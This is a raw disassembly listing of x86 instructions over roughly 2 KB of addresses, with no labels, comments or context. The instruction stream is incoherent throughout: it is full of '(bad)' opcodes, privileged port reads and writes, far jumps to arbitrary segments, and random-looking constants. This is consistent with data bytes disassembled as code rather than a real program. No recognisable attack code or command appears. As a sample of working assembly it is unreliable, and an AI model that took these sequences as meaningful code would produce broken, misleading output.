  425b58:	sub    DWORD PTR ds:0x7530c77f,0xa52a3ce5
  425b62:	sub    al,BYTE PTR [edx-0x6f]
  425b65:	pop    edx
  425b66:	lock xor dl,dh
  425b69:	jmp    0xdfa6:0xbd29b311
  425b70:	mov    ebp,0x50d2c17d
  425b75:	jmp    0xd5b4:0x91286cfa
  425b7c:	add    BYTE PTR [ebx-0x31],bh
  425b7f:	aaa    
  425b80:	cmc    
  425b81:	call   0xfe70:0xf8ec63af
  425b88:	cli    
  425b89:	out    0x47,al
  425b8b:	push   ebx
  425b8c:	jae    0x425b3d
  425b8e:	bound  ebp,QWORD PTR [edi+edi*4]
  425b91:	push   edi
  425b92:	xor    eax,0xa8787824
  425b97:	pop    edi
  425b98:	sbb    al,0x9b
  425b9a:	in     eax,dx
  425b9b:	sub    DWORD PTR [eax+esi*1],0xffffffef
  425b9f:	nop
  425ba0:	(bad)  
  425ba1:	xchg   ecx,eax
  425ba2:	dec    edi
  425ba3:	sub    al,0x9d
  425ba5:	int3   
  425ba6:	repz sub BYTE PTR [edi+0x64],dl
  425baa:	out    0x26,eax
  425bac:	dec    ebp
  425bad:	test   DWORD PTR [edi+0x27],ebp
  425bb0:	mov    dl,0xfe
  425bb2:	mov    ch,0x89
  425bb4:	pushf  
  425bb5:	xor    BYTE PTR [ebp+0x35],al
  425bb8:	enter  0x4df9,0x31
  425bbc:	icebp  
  425bbd:	cmp    DWORD PTR [eax-0x1ac1aa0],esp
  425bc3:	cmp    bl,BYTE PTR [ebx-0x2]
  425bc6:	dec    ecx
  425bc7:	(bad)  
  425bc8:	pop    ebp
  425bc9:	mov    dh,0x50
  425bcb:	pop    ebp
  425bcc:	mov    ch,0x27
  425bce:	fwait
  425bcf:	out    0x13,al
  425bd1:	pop    es
  425bd2:	call   0xe95b415b
  425bd7:	add    BYTE PTR [ebp-0x1d2c86f2],dl
  425bdd:	mov    edi,0x8d5b4ec0
  425be2:	(bad)  
  425be3:	or     al,0x95
  425be5:	mov    bl,0xb5
  425be7:	push   cs
  425be8:	fld    QWORD PTR [ecx]
  425bea:	and    al,0x4e
  425bec:	xchg   DWORD PTR [edx-0x3004a39f],ebp
  425bf2:	in     al,0xa6
  425bf4:	xor    eax,0xf7e8e723
  425bf9:	adc    DWORD PTR [ecx],edi
  425bfb:	lock lock sbb BYTE PTR [edx+0x2f194c53],ah
  425c03:	jge    0x425bb0
  425c05:	les    eax,FWORD PTR [ebx+0x2966c478]
  425c0b:	clc    
  425c0c:	and    bh,bl
  425c0e:	sub    edi,DWORD PTR [esi-0x2b1235f4]
  425c14:	hlt    
  425c15:	das    
  425c16:	loopne 0x425c41
  425c18:	ins    BYTE PTR es:[edi],dx
  425c19:	mov    BYTE PTR [ecx+0x41],cl
  425c1c:	dec    edi
  425c1d:	pmullw mm6,QWORD PTR [esi]
  425c20:	mov    ds:0x6b9b54c,eax
  425c25:	xor    ah,BYTE PTR [ebp+0x499c8e01]
  425c2b:	aad    0x87
  425c2d:	and    DWORD PTR [esi-0x5a3634d9],esp
  425c33:	push   esp
  425c34:	bnd jae 0x425c7a
  425c37:	push   edx
  425c38:	ds push ss
  425c3a:	inc    ecx
  425c3b:	fsub   st(7),st
  425c3d:	xor    eax,ebx
  425c3f:	out    dx,eax
  425c40:	imul   ebx,DWORD PTR [eax+0x61],0xde049825
  425c47:	stos   DWORD PTR es:[edi],eax
  425c48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c49:	sbb    bh,BYTE PTR [eax+0x66]
  425c4c:	push   esp
  425c4d:	sub    DWORD PTR [eax+0x25],ebx
  425c50:	test   BYTE PTR ds:0xa1bf830d,0xc
  425c57:	adc    bh,BYTE PTR [ebx+0x58b0acfd]
  425c5d:	loope  0x425cd3
  425c5f:	jl     0x425cd4
  425c61:	call   0x4479575d
  425c66:	xchg   edx,eax
  425c67:	push   ebp
  425c68:	xchg   BYTE PTR [eax+0x40767275],bl
  425c6e:	mov    ds:0x940dae1,al
  425c73:	retf   
  425c74:	aaa    
  425c75:	jge    0x425c7c
  425c77:	sbb    al,0x2c
  425c79:	(bad)  [eax]
  425c7b:	mov    ecx,0x3a34a2f9
  425c80:	xchg   edx,eax
  425c81:	xchg   DWORD PTR [edx+0x49444d2c],ebx
  425c87:	and    DWORD PTR [edi],ecx
  425c89:	stc    
  425c8a:	stos   DWORD PTR es:[edi],eax
  425c8b:	loopne 0x425c73
  425c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c8e:	xchg   BYTE PTR [ecx*8+0x1aec5974],dl
  425c95:	pushf  
  425c96:	popa   
  425c97:	in     al,dx
  425c98:	fs out dx,al
  425c9a:	stc    
  425c9b:	push   eax
  425c9c:	cmp    ecx,DWORD PTR [eax-0x5124de5b]
  425ca2:	iret   
  425ca3:	add    eax,0x396a42c1
  425ca8:	repnz dec BYTE PTR [ebp+0x50cd4fb8]
  425caf:	dec    edi
  425cb0:	inc    ecx
  425cb1:	and    eax,0x695c2d97
  425cb6:	hlt    
  425cb7:	call   0x847f:0xc56262f8
  425cbe:	ins    DWORD PTR es:[edi],dx
  425cbf:	fsub   DWORD PTR [eax+0x8]
  425cc2:	retf   
  425cc3:	push   ebp
  425cc4:	sbb    eax,0xaf6295a5
  425cc9:	cmp    eax,0x4554a6e6
  425cce:	and    ecx,DWORD PTR [esi-0x24e438e]
  425cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cd5:	(bad)  
  425cd6:	iret   
  425cd7:	aaa    
  425cd8:	out    dx,eax
  425cd9:	icebp  
  425cda:	pop    edx
  425cdb:	mov    ds,WORD PTR [eax-0x6a846840]
  425ce1:	inc    edx
  425ce2:	ins    DWORD PTR es:[edi],dx
  425ce3:	xchg   BYTE PTR [edi+0x172d2b54],dl
  425ce9:	popa   
  425cea:	(bad)  
  425cec:	mov    esp,0x1cd8ecf5
  425cf1:	cdq    
  425cf2:	clc    
  425cf3:	xchg   esi,eax
  425cf4:	mov    ch,0x96
  425cf6:	es ss inc ebx
  425cf9:	ret    0x5ad6
  425cfc:	ret    0x4c4f
  425cff:	(bad)  
  425d00:	loope  0x425c95
  425d02:	inc    esi
  425d03:	push   cs
  425d04:	lods   eax,DWORD PTR ds:[esi]
  425d05:	push   ebp
  425d06:	mov    ds:0x370f68d0,al
  425d0b:	xchg   edi,eax
  425d0c:	das    
  425d0d:	push   ecx
  425d0e:	xchg   esp,eax
  425d0f:	enter  0x52e7,0x4d
  425d13:	les    edx,FWORD PTR [esi+0x2aab5c8b]
  425d19:	lds    esi,FWORD PTR fs:[ecx-0x38295432]
  425d20:	scas   al,BYTE PTR es:[edi]
  425d21:	int3   
  425d22:	sbb    eax,DWORD PTR [edx+0x21e1909a]
  425d28:	out    0xba,eax
  425d2a:	sbb    BYTE PTR [edi],bl
  425d2c:	popf   
  425d2d:	in     al,0xcd
  425d2f:	scas   eax,DWORD PTR es:[edi]
  425d30:	or     eax,0xcee4aa17
  425d35:	or     ch,BYTE PTR [edi-0x75f0e432]
  425d3b:	pusha  
  425d3c:	inc    DWORD PTR [ebx]
  425d3e:	into   
  425d3f:	jl     0x425cde
  425d41:	or     DWORD PTR [edx-0x4],ebx
  425d44:	sub    eax,DWORD PTR ds:0xee941611
  425d4a:	cmp    eax,0xa3255b93
  425d4f:	mov    eax,ds:0xc9000f82
  425d54:	push   ecx
  425d55:	cmp    bl,bl
  425d57:	push   ecx
  425d58:	push   0xffffffe5
  425d5a:	or     eax,DWORD PTR [ebx+0x3a3281e3]
  425d60:	push   DWORD PTR [ebx-0xe948f09]
  425d66:	xchg   edi,eax
  425d67:	or     cl,BYTE PTR [edx+ecx*2]
  425d6a:	mov    ebp,0x95abce0a
  425d6f:	inc    ecx
  425d70:	dec    esp
  425d71:	(bad)  
  425d72:	adc    ebx,DWORD PTR [edi+0x5d]
  425d75:	out    dx,al
  425d76:	mov    ecx,0x8029171a
  425d7b:	lods   al,BYTE PTR ds:[esi]
  425d7c:	mov    WORD PTR [esi],?
  425d7e:	gs stos BYTE PTR es:[edi],al
  425d80:	xchg   edi,eax
  425d81:	jnp    0x425dc7
  425d83:	clc    
  425d84:	fdivr  QWORD PTR [esi-0x3a]
  425d87:	ins    DWORD PTR es:[edi],dx
  425d88:	ja     0x425d5e
  425d8a:	std    
  425d8b:	xor    esi,DWORD PTR [edi-0x6b]
  425d8e:	mov    eax,0x7899dbac
  425d93:	retf   0x681a
  425d96:	jbe    0x425da8
  425d98:	inc    esi
  425d99:	call   0x109d7bd4
  425d9e:	clc    
  425d9f:	sub    ch,dh
  425da1:	pop    esi
  425da2:	ja     0x425d6c
  425da4:	iret   
  425da5:	aas    
  425da6:	dec    edi
  425da7:	jge    0x425dbd
  425da9:	push   cs
  425daa:	bound  ebx,QWORD PTR [ecx+0x31]
  425dad:	in     eax,0xfe
  425daf:	sahf   
  425db0:	push   edx
  425db1:	aam    0xf9
  425db3:	adc    al,0x99
  425db5:	add    al,0x1a
  425db7:	daa    
  425db8:	aas    
  425db9:	sbb    DWORD PTR [edx+0x15],0xb2623910
  425dc0:	aas    
  425dc1:	jnp    0x425dce
  425dc3:	sahf   
  425dc4:	data16 je 0x425d76
  425dc7:	inc    edx
  425dc8:	cmp    eax,ecx
  425dca:	stos   BYTE PTR es:[edi],al
  425dcb:	mov    edi,0x95da723e
  425dd0:	test   al,0x83
  425dd2:	jl     0x425d8e
  425dd4:	or     esp,edx
  425dd6:	pusha  
  425dd7:	cmp    dh,BYTE PTR [ecx+0x4c]
  425dda:	mov    eax,0x7777e402
  425ddf:	addr16 mov al,0xa8
  425de2:	fst    DWORD PTR [esi]
  425de4:	in     eax,dx
  425de5:	xchg   bh,bl
  425de7:	jno    0x425e45
  425de9:	xor    BYTE PTR [edx+0x14b71722],cl
  425def:	pand   mm7,QWORD PTR [edi-0x1b]
  425df3:	enter  0xd6e1,0x95
  425df7:	ds clc 
  425df9:	aam    0x52
  425dfb:	and    BYTE PTR [ebx-0x3eac0be6],ah
  425e01:	add    dl,dh
  425e03:	xor    ebp,ebx
  425e05:	daa    
  425e06:	clc    
  425e07:	pop    esi
  425e08:	cdq    
  425e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e0a:	mov    edi,0xb3cb07f6
  425e0f:	cld    
  425e10:	push   ds
  425e11:	xchg   edx,eax
  425e12:	iret   
  425e13:	inc    edx
  425e14:	cmp    edi,DWORD PTR [ebp-0x37b06a99]
  425e1a:	pop    ds
  425e1b:	dec    esp
  425e1c:	pop    es
  425e1d:	cmp    al,0x9c
  425e1f:	int3   
  425e20:	bnd ja 0x425da4
  425e23:	test   eax,0x833fe875
  425e28:	jg     0x425db8
  425e2a:	fcomp  QWORD PTR [ecx]
  425e2c:	call   0xfa10:0x24546fbb
  425e33:	mov    ds:0x2cb4ad90,eax
  425e38:	sbb    edx,DWORD PTR [ecx+edx*8]
  425e3b:	mov    ecx,DWORD PTR ds:0x665be268
	...
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0xf4
  425e57:	adc    eax,0xebbf37c1
  425e5c:	add    DWORD PTR [eax],eax
  425e5e:	jg     0x425e66
  425e60:	add    BYTE PTR [eax],al
  425e62:	lock mov edi,0x14d97888
  425e68:	scas   eax,DWORD PTR es:[edi]
  425e69:	mul    BYTE PTR [ebx+0x1c212642]
  425e6f:	fisub  WORD PTR [esi+ebp*1-0xf]
  425e73:	jg     0x425ea5
  425e75:	(bad)  
  425e76:	adc    al,0xc9
  425e78:	pop    esp
  425e79:	cmp    bh,BYTE PTR [eax]
  425e7b:	jl     0x425e9e
  425e7d:	jge    0x425e13
  425e7f:	not    DWORD PTR [esp+edi*8]
  425e82:	or     DWORD PTR [eax],0x31eebe45
  425e88:	scas   eax,DWORD PTR es:[edi]
  425e89:	ds add al,0x49
  425e8c:	into   
  425e8d:	dec    ebp
  425e8e:	loop   0x425eb1
  425e90:	mov    ecx,0xa8585ac9
  425e95:	imul   esi,DWORD PTR [ebx],0xffffffb0
  425e98:	jge    0x425e3e
  425e9a:	retf   0x72a1
  425e9d:	gs fwait
  425e9f:	mov    ch,0xb8
  425ea1:	push   0xffffffeb
  425ea3:	mov    eax,ds:0xb0fe5983
  425ea8:	push   ebp
  425ea9:	cdq    
  425eaa:	xor    eax,0xa38614dd
  425eaf:	pop    eax
  425eb0:	repz jo 0x425ee4
  425eb3:	adc    eax,0xe62556d2
  425eb8:	js     0x425e3b
  425eba:	mov    ds:0x45e45c8d,al
  425ebf:	mov    esp,0x93bf539d
  425ec4:	es in  al,0x9
  425ec7:	jns    0x425e6e
  425ec9:	and    al,0x2b
  425ecb:	dec    ebx
  425ecc:	imul   edx,ebx,0xe16ba3eb
  425ed2:	dec    esp
  425ed3:	push   ds
  425ed4:	dec    ecx
  425ed5:	adc    BYTE PTR [esi+0x9e94e82],0xff
  425edc:	data16 jge 0x425f41
  425edf:	mov    ebx,0xaf7b2e5d
  425ee4:	retf   
  425ee5:	inc    esp
  425ee6:	mov    ah,0x46
  425ee8:	mov    al,ds:0x8b1a4b39
  425eed:	jae    0x425ee9
  425eef:	dec    esp
  425ef0:	sub    ch,al
  425ef2:	clc    
  425ef3:	daa    
  425ef4:	fdiv   st(3),st
  425ef6:	jne    0x425f32
  425ef8:	push   eax
  425ef9:	fbld   TBYTE PTR [edi]
  425efb:	sbb    edi,DWORD PTR [ebx]
  425efd:	imul   ebp,DWORD PTR [ecx],0x77
  425f00:	imul   edx,ecx,0xffffff95
  425f03:	popf   
  425f04:	jo     0x425ead
  425f06:	push   ebp
  425f07:	mov    DWORD PTR [esi],esp
  425f09:	xchg   edi,eax
  425f0a:	sbb    ebp,edi
  425f0c:	sub    eax,0xe3941c6b
  425f11:	and    al,0x52
  425f13:	pop    ecx
  425f14:	jg     0x425f0b
  425f16:	sub    ah,BYTE PTR [esi+0x265967ef]
  425f1c:	mov    ds:0xee7a7748,eax
  425f21:	(bad)  
  425f22:	push   esp
  425f23:	push   ds
  425f24:	inc    eax
  425f25:	jmp    0xeb61:0x97ea3178
  425f2c:	out    0x35,eax
  425f2e:	jl     0x425ed6
  425f30:	cmp    cl,BYTE PTR [ebp+0x19]
  425f33:	mov    ebp,0x62bad254
  425f38:	mov    bl,0x90
  425f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f3b:	out    0x58,al
  425f3d:	outs   dx,DWORD PTR ds:[esi]
  425f3e:	loopne 0x425f4f
  425f40:	jnp    0x425ec8
  425f42:	sbb    eax,0x88e7e6af
  425f47:	jno    0x425f4e
  425f49:	arpl   sp,sp
  425f4b:	call   0x100c0f81
  425f50:	mov    dl,0x6e
  425f52:	jne    0x425f6e
  425f54:	inc    ebp
  425f55:	test   DWORD PTR [eax],0x917439eb
  425f5b:	in     eax,0x67
  425f5d:	push   cs
  425f5e:	mov    al,0xd
  425f60:	pop    ecx
  425f61:	mov    esi,0xa7daa4c
  425f66:	adc    ecx,esp
  425f68:	push   cs
  425f69:	and    al,0x6f
  425f6b:	test   eax,0xcbaf4b1f
  425f70:	fidiv  WORD PTR [ecx-0x75bd4944]
  425f76:	aas    
  425f77:	or     eax,0x12eb0b4c
  425f7c:	adc    eax,0x3f311c32
  425f81:	mov    al,0x6f
  425f83:	cmp    BYTE PTR [eax-0x2d],0xfe
  425f87:	gs int3 
  425f89:	mov    eax,0xf70ca862
  425f8e:	in     eax,0xe
  425f90:	jl     0x425f32
  425f92:	dec    esi
  425f93:	(bad)  
  425f95:	pusha  
  425f96:	xor    DWORD PTR [eax-0xb08e8b3],0x3e3ea225
  425fa0:	xor    DWORD PTR [edx],ebx
  425fa2:	das    
  425fa3:	inc    eax
  425fa4:	xchg   ecx,eax
  425fa5:	sbb    BYTE PTR [ecx-0x3ef68448],0x52
  425fac:	std    
  425fad:	repz call DWORD PTR [esi-0x549a2280]
  425fb4:	lds    eax,FWORD PTR [eax+0x44]
  425fb7:	push   es
  425fb8:	into   
  425fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fba:	xchg   esi,eax
  425fbb:	in     al,0x9e
  425fbd:	and    DWORD PTR [ebx-0x7fb6f0a1],edi
  425fc3:	sti    
  425fc4:	ss sti 
  425fc6:	sub    ch,BYTE PTR [edi+0x1e0c94e3]
  425fcc:	push   edi
  425fcd:	dec    edi
  425fce:	jae    0x425fd2
  425fd0:	arpl   WORD PTR [eax-0x4c128243],ax
  425fd6:	in     eax,0x73
  425fd8:	clc    
  425fd9:	jp     0x425fdc
  425fdb:	sub    esp,DWORD PTR [eax+0x37]
  425fde:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe0:	cmp    ch,BYTE PTR cs:[ebx-0x73]
  425fe4:	sbb    BYTE PTR [ecx],bh
  425fe6:	and    DWORD PTR [edi],esi
  425fe8:	cld    
  425fe9:	mov    al,ds:0xcaae880c
  425fee:	sub    DWORD PTR [edx-0x16],ebx
  425ff1:	add    dl,cl
  425ff3:	(bad)  
  425ff4:	mov    eax,0xb60b987b
  425ff9:	xor    BYTE PTR [esi+0x1],ch
  425ffc:	adc    ch,BYTE PTR [esp+ebp*4-0x414cbcfb]
  426003:	jo     0x426050
  426005:	dec    esi
  426006:	pop    eax
  426007:	cdq    
  426008:	rcl    DWORD PTR [edx-0x6172361],cl
  42600e:	inc    esp
  42600f:	push   ecx
  426010:	mov    bh,0x74
  426012:	xchg   edi,eax
  426013:	mov    esi,0x740d8192
  426018:	inc    edx
  426019:	cmp    bh,BYTE PTR [esi]
  42601b:	mov    DWORD PTR ds:0x9c47c277,edx
  426021:	std    
  426022:	ss sti 
  426024:	xor    BYTE PTR [ebp+0x5d4e5c0f],cl
  42602a:	loop   0x425fe7
  42602c:	mov    ebp,0xc121eeeb
  426031:	xor    edi,esi
  426033:	hlt    
  426034:	outs   dx,BYTE PTR ds:[esi]
  426035:	adc    BYTE PTR [ebx],bh
  426037:	gs dec edi
  426039:	mov    dl,0x9d
  42603b:	jno    0x426053
  42603d:	and    al,0x80
  42603f:	xor    ax,0xb649
  426043:	mov    al,0xf0
  426045:	std    
  426046:	leave  
  426047:	stc    
  426048:	cmp    DWORD PTR [ebp-0x450bc4a7],ecx
  42604e:	add    ecx,ebx
  426050:	add    esi,edi
  426052:	not    BYTE PTR ds:0xa2ac302f
  426058:	dec    edi
  426059:	add    eax,0x6caba5c5
  42605e:	sub    eax,0x93d3f8fe
  426063:	in     al,dx
  426064:	pop    ecx
  426065:	sbb    eax,0x220d3e82
  42606a:	push   ecx
  42606b:	xor    ch,al
  42606d:	bound  ebp,QWORD PTR [esi]
  42606f:	add    ebp,DWORD PTR [esi-0xade7ee6]
  426075:	fcomp  QWORD PTR [ecx]
  426077:	fstp   QWORD PTR [esi+eax*4]
  42607a:	adc    edx,DWORD PTR [ebx]
  42607c:	aam    0xae
  42607e:	cli    
  42607f:	test   DWORD PTR [edi+0x77],ecx
  426082:	sbb    dl,BYTE PTR [ecx+edi*4+0xcfe7aba]
  426089:	xor    dh,BYTE PTR [ecx+0x64c00999]
  42608f:	call   0xbad7:0xc60d2bd3
  426096:	loop   0x4260d4
  426098:	(bad)  
  426099:	add    eax,0x6291b852
  42609e:	mov    eax,0xab044a80
  4260a3:	mov    ecx,DWORD PTR [ecx]
  4260a5:	out    dx,al
  4260a6:	cmc    
  4260a7:	xchg   BYTE PTR [esi+0x179f3df3],bh
  4260ad:	inc    ebx
  4260ae:	js     0x426124
  4260b0:	fs int 0x25
  4260b3:	dec    ecx
  4260b4:	(bad)  
  4260b6:	sbb    ecx,DWORD PTR [ebx]
  4260b8:	push   0xcf7d8192
  4260bd:	dec    esp
  4260be:	es add al,0x42
  4260c1:	xor    al,0x74
  4260c3:	or     eax,0xe8f71037
  4260c8:	dec    edx
  4260c9:	imul   DWORD PTR [edx+ebp*4]
  4260cc:	in     al,dx
  4260cd:	adc    eax,0x35b3913b
  4260d2:	lods   al,BYTE PTR ds:[esi]
  4260d3:	xor    ebx,DWORD PTR [esi+0x55]
  4260d6:	jns    0x4260b4
  4260d8:	pop    edx
  4260d9:	(bad)  
  4260da:	ins    DWORD PTR es:[edi],dx
  4260db:	push   edx
  4260dc:	xor    DWORD PTR [edx],0x820ca602
  4260e2:	cmp    BYTE PTR ds:0xd0c67ab,cl
  4260e8:	xor    dl,BYTE PTR [eax]
  4260ea:	adc    eax,0x112a5041
  4260f0:	dec    edi
  4260f1:	mov    BYTE PTR [esi+0x6c],al
  4260f4:	cmp    ebx,DWORD PTR [esi+0x78]
  4260f7:	shr    DWORD PTR [ebx+ecx*8+0x59427714],0xaf
  4260ff:	or     al,0x2f
  426101:	push   ebx
  426102:	test   eax,0xdafadbb1
  426107:	push   ebp
  426108:	fwait
  426109:	ss mov bh,0x9b
  42610c:	popa   
  42610d:	mov    al,0x8e
  42610f:	scas   al,BYTE PTR es:[edi]
  426110:	pushf  
  426111:	(bad)  
  426112:	aas    
  426113:	sahf   
  426114:	adc    bl,ch
  426116:	hlt    
  426117:	jb     0x42614d
  426119:	jbe    0x4260ac
  42611b:	mov    dl,0xe9
  42611d:	push   ebp
  42611e:	mov    esp,0x8336abf9
  426123:	loopne 0x4260fd
  426125:	add    dh,BYTE PTR [eax+0x69]
  426128:	push   cs
  426129:	out    dx,al
  42612a:	jecxz  0x42611a
  42612c:	and    al,0xd3
  42612e:	sub    al,0xee
  426130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426131:	and    BYTE PTR [ebx-0x71],ch
  426134:	xchg   esi,eax
  426135:	or     ebx,eax
  426137:	cld    
  426138:	push   0xffffffd9
  42613a:	out    0xf2,al
  42613c:	jb     0x4260d1
  42613e:	fisubr WORD PTR [eax]
  426140:	mov    dl,BYTE PTR [ecx-0x79abc714]
  426146:	dec    esi
  426147:	jno    0x42611b
  426149:	mov    bh,0x46
  42614b:	mov    ch,0x5f
  42614d:	add    al,0x21
  42614f:	pusha  
  426150:	in     al,dx
  426151:	and    eax,0xfa7e66f
  426156:	(bad)  
  426158:	cmp    al,0xd6
  42615a:	cld    
  42615b:	jl     0x426135
  42615d:	sub    ecx,esp
  42615f:	(bad)  
  426160:	mov    bl,0x6e
  426162:	jge    0x426103
  426164:	pop    ecx
  426165:	js     0x4261db
  426167:	mov    BYTE PTR [ebp-0x3c880b1d],0x95
  42616e:	add    eax,0x6aa5a2e
  426173:	cmp    ch,0x66
  426176:	bound  edx,QWORD PTR [ebp-0x3a]
  426179:	push   ss
  42617a:	rcr    BYTE PTR [eax-0x4fc37d75],1
  426180:	popf   
  426181:	fdivr  st,st(3)
  426183:	sbb    DWORD PTR [esi+ebp*2-0x2f],esp
  426187:	xor    eax,0x49e3f019
  42618c:	pop    esi
  42618d:	rol    ah,1
  42618f:	nop
  426190:	push   esi
  426191:	or     BYTE PTR [bp+di+0xe],0x3b
  426196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426197:	add    eax,0xe06a36c2
  42619c:	sbb    eax,esi
  42619e:	hlt    
  42619f:	sti    
  4261a0:	rcr    DWORD PTR [esi+esi*4-0x2b],cl
  4261a4:	mov    BYTE PTR [edi+0x1f98989],bl
  4261aa:	cmp    eax,0x78f4faae
  4261af:	test   eax,0x17e77975
  4261b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261b5:	(bad)  
  4261b7:	call   esi
  4261b9:	push   ebp
  4261ba:	stos   DWORD PTR es:[edi],eax
  4261bb:	lds    esi,FWORD PTR [ecx+eax*4+0x66]
  4261bf:	adc    BYTE PTR [edx+eax*4-0x705dc824],al
  4261c6:	out    dx,eax
  4261c7:	xor    BYTE PTR [esi],cl
  4261c9:	out    dx,eax
  4261ca:	inc    ecx
  4261cb:	mov    ebx,0x326495db
  4261d0:	jmp    0x5401:0x7086ac99
  4261d7:	dec    edi
  4261d8:	mov    esi,0x9325b8c8
  4261dd:	icebp  
  4261de:	sbb    eax,0xbfd8f1b9
  4261e3:	(bad)  
  4261e4:	jecxz  0x4261c7
  4261e6:	ss in  eax,dx
  4261e8:	fistp  DWORD PTR [edi+0x24]
  4261eb:	sub    al,BYTE PTR [eiz*1+0x357913c7]
  4261f2:	lods   eax,DWORD PTR ds:[esi]
  4261f3:	inc    ebx
  4261f4:	mov    dl,BYTE PTR [ebx+0x2982915c]
  4261fa:	cmp    al,BYTE PTR [eax]
  4261fc:	push   ebp
  4261fd:	mov    ebp,0xbe13172b
  426202:	lea    eax,[eax+0x169d81f1]
  426208:	inc    esi
  426209:	scas   al,BYTE PTR es:[edi]
  42620a:	(bad)  
  42620b:	inc    ebp
  42620c:	pop    ss
  42620d:	sbb    DWORD PTR [eax+0x10],ecx
  426210:	mov    edi,0x4f95d0e6
  426215:	xor    al,0x5e
  426217:	lds    ecx,FWORD PTR [ebp+0x43ee8453]
  42621d:	sbb    eax,0xd015384b
  426222:	or     edi,DWORD PTR [esi+edx*1+0x53]
  426226:	mov    ds:0x5ad63d93,eax
  42622b:	mov    eax,0x60713ed9
  426230:	loop   0x4261e3
  426232:	xchg   ecx,eax
  426233:	shl    DWORD PTR [edi],cl
  426235:	or     al,0x7e
  426237:	rcl    BYTE PTR [ecx],1
  426239:	jge    0x4261ed
  42623b:	in     al,dx
  42623c:	sahf   
  42623d:	jbe    0x4261d7
  42623f:	ret    0xafaf
  426242:	mov    eax,0xb4838f61
  426247:	and    ecx,DWORD PTR [ebx+0x4b3707e3]
  42624d:	cmc    
  42624e:	rcl    dl,1
  426250:	ret    
  426251:	icebp  
  426252:	inc    eax
  426253:	sbb    BYTE PTR [ebx-0x70],cl
  426256:	data16 fild QWORD PTR [ebp+0x213030eb]
  42625d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42625e:	cmc    
  42625f:	(bad)  
  426260:	cmp    edx,DWORD PTR [ebp+0x31c44ba]
  426266:	push   ebp
  426267:	or     ebx,edx
  426269:	push   edx
  42626a:	adc    DWORD PTR [ebx-0x7d],esp
  42626d:	jo     0x4262c3
  42626f:	cmp    ah,BYTE PTR [ebp-0x1e]
  426272:	sbb    bh,0xa5
  426275:	inc    edx
  426276:	stos   DWORD PTR es:[edi],eax
  426277:	icebp  
  426278:	inc    esp
  426279:	add    eax,0xbae77641
  42627e:	stc    
  42627f:	inc    edi
  426280:	fsubr  QWORD PTR [ebp+ebx*4-0x41]
  426284:	mov    BYTE PTR [edx],dh
  426286:	jge    0x42628b
  426288:	cmc    
  426289:	mov    ebx,0xee2af7c8
  42628e:	scas   eax,DWORD PTR es:[edi]
  42628f:	inc    edi
  426290:	jo     0x426284
  426292:	es aad 0x2f
  426295:	lock aam 0x5a
  426298:	scas   al,BYTE PTR es:[edi]
  426299:	aam    0x56
  42629b:	mov    ds:0x44e181ec,eax
  4262a0:	mov    eax,DWORD PTR [ebx-0x3228bc2e]
  4262a6:	retf   0xdfcc
  4262a9:	inc    edx
  4262aa:	inc    eax
  4262ab:	(bad)  
  4262ac:	cmovge ebx,DWORD PTR [esi+edx*4]
  4262b0:	ss and al,0x37
  4262b3:	std    
  4262b4:	mov    edi,0x767347b7
  4262b9:	icebp  
  4262ba:	mov    ebp,eax
  4262bc:	sbb    eax,0x430231c5
  4262c1:	mov    ebp,0xffa25582
  4262c6:	mov    al,0xc9
  4262c8:	scas   al,BYTE PTR es:[edi]
  4262c9:	imul   ebp,esi,0xffffff88
  4262cc:	xor    cl,BYTE PTR [ebx]
  4262ce:	inc    esi
  4262cf:	xor    al,0x86
  4262d1:	js     0x4262e0
  4262d3:	adc    esp,DWORD PTR [edx+0x0]
  4262d6:	iret   
  4262d7:	cmp    al,0x72
  4262d9:	ss cli 
  4262db:	es jg  0x4262fc
  4262de:	out    0x12,al
  4262e0:	sbb    eax,DWORD PTR [ebp-0x6e]
  4262e3:	retf   
  4262e4:	icebp  
  4262e5:	push   es
  4262e6:	pop    ebp
  4262e7:	push   es
  4262e8:	push   esi
  4262e9:	push   ebx
  4262ea:	es test eax,0x5c4d6df2
  4262f0:	sbb    al,0x52
  4262f2:	push   cs
  4262f3:	xor    bh,BYTE PTR ss:[edx]
  4262f6:	mov    cl,0xb4
  4262f8:	push   es
  4262f9:	pop    esp
  4262fa:	loop   0x42631e
  4262fc:	(bad)  
  4262fd:	adc    BYTE PTR [ebp+0x4157cf11],bh
  426303:	mov    cl,0x32
  426305:	dec    ebp
  426306:	arpl   WORD PTR [ecx],bp
  426308:	scas   eax,DWORD PTR es:[edi]
  426309:	int    0xd5
  42630b:	xor    bl,dh
  42630d:	test   BYTE PTR [edi],bl
  42630f:	cmp    BYTE PTR ds:[eax+0x1],dl
  426313:	into   
  426314:	and    esp,eax
  426316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426317:	mov    al,0x8b
  426319:	dec    ecx
  42631a:	cmp    DWORD PTR [eax+0x4b],ebp
  42631d:	sub    al,0xa9
  42631f:	ja     0x42637e
  426321:	sahf   
  426322:	sbb    dl,cl
  426324:	push   edi
  426325:	xchg   esi,eax
  426326:	call   0xdbf8:0x5d66619
  42632d:	mov    esi,0x4ff6b3cb
  426332:	fcomp  DWORD PTR [edx+0x662632a2]
  426338:	scas   al,BYTE PTR es:[edi]
  426339:	inc    esp
  42633a:	inc    esi
  42633b:	mov    ds:0x2bc60ab5,eax
  426340:	sub    eax,0x25ba954e
  426345:	mov    eax,ds:0xc3859124
  42634a:	int3   
  42634b:	xchg   ebp,eax
  42634c:	out    0x5e,eax
  42634e:	out    0xb7,al
  426350:	out    dx,eax
  426351:	ret    0xf1ab
  426354:	push   ss
